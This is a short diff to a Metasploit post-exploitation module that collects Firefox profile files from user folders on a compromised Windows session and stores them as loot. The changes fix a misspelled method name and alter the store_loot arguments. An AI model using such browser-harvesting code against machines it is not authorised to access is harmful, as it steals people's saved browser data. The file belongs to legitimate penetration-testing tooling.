@@ -149,7 +149,7 @@ class Metasploit3 < Msf::Post
 			session.fs.dir.foreach(@users) do |path|
 				next if path =~ /^\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService$/
 				firefox = @users + "\\" + path + @appdata
-				dir = check_firfox(firefox)
+				dir = check_firefox(firefox)
 				if dir
 					dir.each do |p|
 						paths << p
@@ -220,7 +220,7 @@ class Metasploit3 < Msf::Post
 							mime = "binary"
 						end
 						file = file.split('\\').last
-						store_loot("firefox.#{file}", "#{mime}/#{ext}", session.tunnel_peer, loot, "firefox_#{file}", "Firefox #{file} File")
+						store_loot("firefox.#{file}", "#{mime}/#{ext}", session, loot, "firefox_#{file}", "Firefox #{file} File")
 					end
 				end
 			end
@@ -238,7 +238,7 @@ class Metasploit3 < Msf::Post
 							mime = "binary"
 						end
 						file = file.split('/').last
-						store_loot("firefox.#{file}", "#{mime}/#{ext}", session.tunnel_peer, loot, "firefox_#{file}", "Firefox #{file} File")
+						store_loot("firefox.#{file}", "#{mime}/#{ext}", session, loot, "firefox_#{file}", "Firefox #{file} File")
 					end
 				end
 			end
